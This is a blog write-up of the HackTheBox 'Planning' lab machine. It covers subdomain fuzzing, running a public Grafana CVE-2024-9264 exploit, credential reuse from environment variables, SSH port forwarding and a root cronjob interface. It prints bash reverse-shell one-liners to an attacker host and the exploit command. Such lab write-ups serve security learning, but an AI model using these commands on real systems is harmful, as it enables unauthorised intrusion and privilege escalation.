---
layout: post
title: "HTB Planning Writeup"
date: 2025-09-14 13:18:55 -0400
categories: hackthebox HTB-easy
tags: hacking CTF HTB HTB-easy port-forwarding linux
---
## Introduction
This is an easy Linux machine on [HackTheBox](https://app.hackthebox.com/machines/Planning){:target="_blank"}{:rel="noopener noreferrer"}. We're given credentials at the beginning that are useful later 

```
admin:0D5oT70Fq13EvB5r
```

![htb-planning-pwn](images/HTB-planning/htb-planning-pwn.png)

## Enumeration
### Port Scan
As always we need to find accessible services with a port scan
```bash
rustscan -a <MACHINE_IP> -- -A -sCV
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.68:22
Open 10.10.11.68:80
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

Let's add the domain to our `/etc/hosts` file
```
<MACHINE_IP> planning.htb
```
### Subdomain
After my initial scans I didn't find anything of interest but let's check the page source.
```html
<!-- Formulario con método GET -->
<!-- snip -->
<!-- Mostrar los resultados debajo de la barra de búsqueda -->
```

Some comments are in **Spanish!**  Using a Spanish wordlist revealed a new subdomain!
```bash
wfuzz -c -t 50 -u http://planning.htb -H 'Host: FUZZ.planning.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-spanish.txt --hw 12
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://planning.htb/
Total requests: 5370

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000002556:   302        2 L      2 W        29 Ch       "grafana"                     

Total time: 5.497129
Processed Requests: 5370
Filtered Requests: 5369
Requests/sec.: 976.8734
```

Let's add this to our `/etc/hosts` file
```
<MACHINE_IP> planning.htb grafana.htb
```

## Initial Foothold
Visiting `grafana.planning.htb` and using the credentials provided at the beginning, we can access the **admin dashboard**

```
admin:0D5oT70Fq13EvB5r
```

![htb-planning-grafana-version](images/HTB-planning/htb-planning-grafana-version.png)

This version is vulnerable to **authenticated remote code execution** and there is a [public exploit](https://github.com/nollium/CVE-2024-9264){:target="_blank"}{:rel="noopener noreferrer"} readily available. 

Let's download the repo and install the requirements
```bash
git clone https://github.com/nollium/CVE-2024-9264.git
```

```bash
pip3 install -r requirements.txt
```

Now we can send a [reverse shell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
```bash
nc -lvnp 4444 # listener on the attacking machine
```

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c '/bin/bash -c "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' http://grafana.planning.htb
```
- notice the `/bin/bash -c` prepended before the revshell

![htb-planning-foothold](images/HTB-planning/htb-planning-foothold.png)
## user.txt
It looks like we're `root` in a docker container but we want to access the server hosting it. Reading the environment variables we can find a username and password

```bash
root@7ce659d667d7:~# env | grep -i admin
env | grep -i admin
GF_SECURITY_ADMIN_PASSWORD=<PASSWORD-REDACTED>
GF_SECURITY_ADMIN_USER=enzo
```

We can reuse these credentials over `ssh` and grab the first flag
```bash
ssh enzo@planning.htb
```

![htb-planning-user-txt](images/HTB-planning/htb-planning-user-txt.png)

## root.txt
There is a new internal service running on port 8000
```bash
enzo@planning:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:35487         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

We can forward port 8000 **on the server** to port 9999 on **our machine** with the command
```bash
ssh -L 9999:127.0.0.1:8000 enzo@planning.htb
```

Visiting the page requires credentials

![htb-planning-basic-auth](images/HTB-planning/htb-planning-basic-auth.png)

A password can be found in `/opt/crontabs/crontab.db`
```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P <PASSWORD-REDACTED> /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Using the username `root` and the newly discovered password we can access the `Cronjobs` service on the forwarded port

![htb-planning-cronjobs](images/HTB-planning/htb-planning-cronjobs.png)

Through this interface we can run any command as `root`! Let's add a new cronjob that triggers a `root` reverse shell

```bash
# reverse shell payload
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![htb-planning-new-job](images/HTB-planning/htb-planning-new-job.png)

Setup a listener to catch the reverse shell and click `Run now` to execute our command immediately
```bash
nc -lvnp 4444 # listener on attacking machine
```

![htb-planning-root-txt](images/HTB-planning/htb-planning-root-txt.png)
## Recap
By enumerating subdomains with a **Spanish wordlist** we find an outdated service vulnerable to **authenticated remote code execution.** Using the credentials provided to us gives a foothold into the system. **Reused credentials** found in the **environment variables** lets us `ssh` in as the `enzo` user. **Forwarding an internal port** gives us access to a `Cronjob` web interface where we can **run arbitrary commands as root,** giving us a `root` shell!

